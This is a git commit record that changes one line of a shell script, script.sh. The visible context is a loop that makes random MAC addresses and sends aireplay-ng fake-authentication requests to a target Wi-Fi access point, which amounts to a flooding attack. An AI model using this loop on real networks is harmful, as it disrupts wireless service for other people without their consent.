eab4621e6e44eab5680d40a639880c0e9c964cb2
dahni <94286336+D1hn1@users.noreply.github.com>
2022-11-13 19:22:20 +0100

    Update script.sh

--- script.sh
+++ script.sh
@@ -12,4 +12,4 @@ while $true;do
         mac=$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))":"$(($RANDOM%80 + 10))
         sudo timeout 0.3 aireplay-ng -1 0 -a $wifi_mac -h $mac $interface &>/dev/null
         echo "Sending: " $mac
-done
+;done
